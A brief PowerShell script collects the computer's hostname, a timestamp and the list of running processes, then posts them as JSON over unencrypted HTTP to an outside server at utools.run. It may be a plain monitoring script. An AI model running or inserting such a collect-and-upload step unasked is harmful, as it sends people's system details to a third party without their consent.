# collect information and upload to server.

$now=get-date -Format "yyyy/MM/dd-HH:MM:ss"
$hostname=$env:COMPUTERNAME

$BODY = @{}

$msg=Get-Process | Select-Object Id,ProcessName | ConvertTo-Json 

$BODY["HOSTNAME"]=$hostname
$BODY["MESSAGE"]=$msg
$BODY["TIMESTAMP"]=$now

$BODY=$BODY | ConvertTo-Json


Invoke-RestMethod -Method Post -Uri http://utools.run/data -ContentType application/json -Body $BODY
